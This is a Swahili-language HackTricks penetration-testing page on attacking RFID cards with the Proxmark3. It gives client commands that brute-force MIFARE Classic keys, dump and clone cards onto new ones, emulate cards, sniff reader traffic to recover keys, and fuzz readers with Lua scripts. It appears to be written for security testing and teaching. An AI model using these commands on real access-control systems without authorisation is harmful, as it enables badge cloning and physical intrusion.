# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Kushambulia Mifumo ya RFID kwa Proxmark3

Jambo la kwanza unahitaji kufanya ni kuwa na [**Proxmark3**](https://proxmark.com) na [**kufunga programu na utegemezi wake**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Kushambulia MIFARE Classic 1KB

Ina **sektari 16**, kila moja ina **blocks 4** na kila block ina **16B**. UID iko katika sektari 0 block 0 (na haiwezi kubadilishwa).\
Ili kufikia kila sektari unahitaji **funguo 2** (**A** na **B**) ambazo zimehifadhiwa katika **block 3 ya kila sektari** (sektari trailer). Trailer ya sektari pia inahifadhi **vigezo vya ufikiaji** vinavyotoa **ruhusa za kusoma na kuandika** kwenye **kila block** kwa kutumia funguo 2.\
Funguo 2 ni muhimu kutoa ruhusa za kusoma ikiwa unajua ya kwanza na kuandika ikiwa unajua ya pili (kwa mfano).

Mashambulizi kadhaa yanaweza kufanywa
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 inaruhusu kufanya vitendo vingine kama **kusikiliza** mawasiliano ya **Tag na Reader** ili kujaribu kupata data nyeti. Katika kadi hii unaweza tu kusikiliza mawasiliano na kuhesabu funguo iliyotumika kwa sababu **operesheni za kijasusi zilizotumika ni dhaifu** na kujua maandiko ya wazi na maandiko ya cipher unaweza kuhesabu (`mfkey64` tool).

### Amri Mbichi

Mifumo ya IoT wakati mwingine hutumia **vitambulisho visivyo na chapa au visivyo vya kibiashara**. Katika kesi hii, unaweza kutumia Proxmark3 kutuma **amri mbichi za kawaida kwa vitambulisho**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Kwa habari hii unaweza kujaribu kutafuta taarifa kuhusu kadi na kuhusu njia ya kuwasiliana nayo. Proxmark3 inaruhusu kutuma amri za moja kwa moja kama: `hf 14a raw -p -b 7 26`

### Scripts

Programu ya Proxmark3 inakuja na orodha ya **scripts za automatisering** zilizopakiwa awali ambazo unaweza kutumia kufanya kazi rahisi. Ili kupata orodha kamili, tumia amri ya `script list`. Kisha, tumia amri ya `script run`, ikifuatiwa na jina la script:
```
proxmark3> script run mfkeys
```
Unaweza kuunda skripti ya **fuzz tag readers**, hivyo kunakili data ya **kadi halali** andika **Lua script** ambayo **randomize** moja au zaidi **bytes** za nasibu na uangalie kama **reader inashindwa** na iteration yoyote. 

{{#include ../../banners/hacktricks-training.md}}
